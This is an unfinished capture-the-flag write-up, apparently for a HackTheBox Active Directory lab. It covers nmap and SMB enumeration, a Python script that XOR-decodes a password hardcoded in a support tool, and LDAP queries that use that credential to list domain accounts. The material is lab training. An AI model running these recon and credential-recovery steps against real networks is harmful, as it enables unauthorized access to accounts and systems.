# Enumeration

Look what ports are opens
```bash
nmap -p- --min-rate 10000 -oA nmap/massive_scan 10.129.224.189
Nmap scan report for 10.129.224.189 (10.129.224.189)
Host is up (0.026s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49667/tcp open  unknown
49678/tcp open  unknown
49690/tcp open  unknown
49695/tcp open  unknown
49711/tcp open  unknown

```

take the ports open and run the nmap with `-sVC` flag
```bash
sudo nmap -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49678,49690,49695,49711 10.129.224.189 -oA complete_scan
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-22 02:24 EDT
Nmap scan report for DC.support.htb0 (10.129.224.189)
Host is up (0.061s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-22 06:24:52Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49711/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-06-22T06:25:42
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 96.80 seconds

```

the hostname `DC` and `support.htb0` are both leaked. I'll update my `hosts` file with `10.129.224.189 DC.support.htb support.htb`

## Shares Enumeration

```bash
smbclient -N -L //support.htb            

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to support.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```

TODO: Aggiungere come scaricare `iLSpy`

![[Pasted image 20250622103330.png]]

to decrypt the base64 string using XOR algorithm we need the value of **key** variable.
`armando` is the **key** value

![[Pasted image 20250622103439.png]]

XOR have is bidirectional means the same method to chiper the string will be use to decrypt. We can use the same c# fuctions founded in PE file but on my kali machine i prefer to use python. This is my python script to decrypt the pasdword

```python

import base64


base64_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = list("armando".encode())

print(base64_password, '\n')
print(key,'\n') 

print("****************** XOR DECRYPT *************************")

array = base64.b64decode(base64_password)
decrypted = bytearray()

for i in range(len(array)):
	byte = (array[i]^key[i % len(key)]) ^ 0xDF
	decrypted.append(byte)

d = decrypted.decode("utf-8")

print(d)


'''
public static string getPassword()
{
	byte[] array = Convert.FromBase64String(enc_password);
	byte[] array2 = array;
	for (int i = 0; i < array.Length; i++)
	{
		array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
	}
	return Encoding.Default.GetString(array2);
}
'''
```



TODO:
spigare che ho dovuto usare '' perche' altrimenti il dollaro viene preso come variabile

```bash
ldapsearch -H LDAP://support.htb -D ldap@support.htb -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" "(ObjectClass=Users)"

```



get all'users with ldap query

```bash
ldapsearch -H LDAP://support.htb -D ldap@support.htb -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" '(objectClass=User)' sAMAccountName | grep sAMAccountName
# requesting: sAMAccountName 
sAMAccountName: Administrator
sAMAccountName: Guest
sAMAccountName: DC$
sAMAccountName: krbtgt
sAMAccountName: ldap
sAMAccountName: support
sAMAccountName: smith.rosario
sAMAccountName: hernandez.stanley
sAMAccountName: wilson.shelby
sAMAccountName: anderson.damian
sAMAccountName: thomas.raphael
sAMAccountName: levine.leopoldo
sAMAccountName: raven.clifton
sAMAccountName: bardot.mary
sAMAccountName: cromwell.gerard
sAMAccountName: monroe.david
sAMAccountName: west.laura
sAMAccountName: langley.lucy
sAMAccountName: daughtler.mabel
sAMAccountName: stoll.rachelle
sAMAccountName: ford.victoria

```

